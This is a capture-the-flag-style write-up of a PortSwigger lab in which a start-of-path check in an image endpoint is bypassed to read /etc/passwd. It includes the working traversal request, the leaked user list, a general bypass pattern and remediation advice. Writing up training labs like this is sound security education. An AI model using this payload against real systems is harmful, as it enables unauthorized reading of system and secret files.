# File path traversal, validation of start of path

**Category:** Path traversal
**Level:** Practitioner
**Mechanism:** Start-of-path validation bypass (prefix + traversal)
**Lab URL:** https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

---

## Vulnerability

Path traversal in the product-image endpoint. Here the application sends the **full**
file path in the `filename` parameter and validates only that it **starts with** the
expected base folder (`/var/www/images/`). That check constrains the prefix but not the
rest of the path, so the payload can satisfy the prefix and then traverse out of the
folder.

## Reconnaissance & Exploitation

Images load with an absolute path: `GET /image?filename=/var/www/images/48.jpg`. The
app rejects anything not beginning with that folder. Confirming the constraint:

```
filename=/etc/passwd                         → (rejected — wrong prefix)
filename=/var/www/images/etc/passwd           → 400 "No such file" (prefix OK, file not there)
```

The second error is the key: `/var/www/images/...` is accepted (prefix check passes),
it just points at a file that does not exist. So I keep the required prefix to pass the
check, then append `../` to climb back out to the filesystem root and down to the
target:

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: 0adb00a80359592681c5acb0009e00fd.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
...
```

Lab solved — `/etc/passwd` retrieved. The path starts with `/var/www/images/` (check
passes) but `../../../` walks up to `/` before descending into `/etc/passwd`. The
validation inspected the start of the string and ignored where the path actually
resolves.

## Impact

Arbitrary file read with the web process's privileges — account enumeration via
`/etc/passwd`, plus source, config, secrets and keys. The lesson: a prefix check is not
a containment check. Validating that a path *begins* inside the allowed folder says
nothing about where it *ends up* once `../` sequences are resolved.

## Remediation

- Validate the **resolved** path, not the raw string. Canonicalise first (`realpath`),
  then confirm the result is still inside the base directory — this catches the embedded
  `../` that a start-with check misses.
- Reject any input containing `../` outright when a filename (not a full path) is
  expected; better still, don't accept full paths from the client at all.
- Best: map an opaque ID to a known file server-side instead of trusting a path.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

## Notes

- Bypass pattern: when a filter checks the *start* of the path, give it the required
  prefix and traverse out afterwards (`<allowed-base>/../../../target`).
- Read the error: `400 "No such file"` (not "forbidden") told me the prefix was accepted
  and only the file was missing — pointing straight at "keep the prefix, change the
  tail".
- Validating one end of a string (start, or extension at the end) is a recurring weak
  defence across these labs — the fix is always to validate the canonical destination.